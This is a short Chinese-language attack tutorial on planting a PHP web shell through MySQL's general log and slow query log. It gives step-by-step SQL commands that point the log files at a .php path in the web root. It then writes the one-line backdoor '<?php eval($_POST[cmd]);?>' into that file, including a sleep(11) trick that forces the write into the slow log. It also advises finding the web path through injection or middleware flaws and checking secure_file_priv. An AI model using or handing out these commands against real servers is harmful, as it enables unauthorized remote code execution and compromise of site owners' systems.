日志写入

1.查看日志是否开启

show variables like '%general%';

一般这个日志记录是默认关闭的，需要我们手动开启

2.开启日志记录

SET GLOBAL general_log='on';

验证是否开启成功


修改日志

3.指定日志文件位置 （web路径自己想办法去弄到可以通过中间件 注入爆或者其他的一些漏洞得到web目录路径）

set global general_log_file='/Applications/phpstudy/WWW/1.php';

#这里一定要用\\，或者使用/，不能使用\。

4.写入

select ('<?php eval($_POST[cmd]);?>');


然后用工具连接

慢日志查询

如果登录了phpMyadmin没有办法直接写入文件，可以使用慢查询日志来进行文件写入。

简单的说就是在mysql中，查询超过10秒的语句会被写到慢查询日志文件中去，一般默认是不开启的。利用这个特性就可以进行文件写入。

利用过程

1.首先查询slow的配置。

show variables like '%slow_query_log%';

2.开启日志

set global slow_query_log=1;

3.设置log日志的位置，设置为web目录下

set global slow_query_log_file='/Applications/phpstudy/WWW/2.php';

4.查看下是否修改成功

show variables like '%slow_query_log%';



触发慢查询日志

select  '<?php eval($_POST[cmd]);?>' or sleep(11);

前提条件  

show global variables like 'secure%' 查看导出权限


选项说明：

secure_file_prive=null   限制mysqld 不允许导入导出secure_file_priv=/var/lib/mysql-files/   限制mysqld的导入导出只能发生在/var/lib/mysql-files/目录下secure_file_priv=''     不对mysqld的导入导出做限制


只有secure_file_priv=''  为空的时候才可以

Drop TABLE IF EXISTS test; //如果存在test就删掉
